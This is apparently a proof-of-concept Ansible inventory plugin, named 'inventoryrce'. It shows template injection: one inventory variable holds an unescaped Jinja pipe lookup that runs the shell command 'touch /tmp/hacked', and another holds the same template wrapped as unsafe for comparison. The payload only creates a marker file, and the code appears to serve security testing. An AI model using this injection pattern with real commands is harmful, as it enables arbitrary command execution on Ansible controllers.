from ansible.plugins.inventory import BaseInventoryPlugin
from ansible.utils.unsafe_proxy import wrap_var

class InventoryModule(BaseInventoryPlugin):

    NAME = 'evgeni.inventoryrce.inventory'  # used internally by Ansible, it should match the file name but not required

    def verify_file(self, path):
        ''' return true/false if this is possibly a valid file for this plugin to consume '''
        valid = False
        if super(InventoryModule, self).verify_file(path):
            # base class verifies that file exists and is readable by current user
            if path.endswith(('evgeni.yaml', 'evgeni.yml')):
                valid = True
        return valid

    def parse(self, inventory, loader, path, cache=True):
        super(InventoryModule, self).parse(inventory, loader, path, cache)
        self.inventory.add_host('exploit.example.com')
        self.inventory.set_variable('exploit.example.com', 'ansible_connection', 'local')
        self.inventory.set_variable('exploit.example.com', 'something_funny', '{{ lookup("pipe", "touch /tmp/hacked" ) }}')
        self.inventory.set_variable('exploit.example.com', 'something_safe', wrap_var('{{ lookup("pipe", "touch /tmp/hacked" ) }}'))
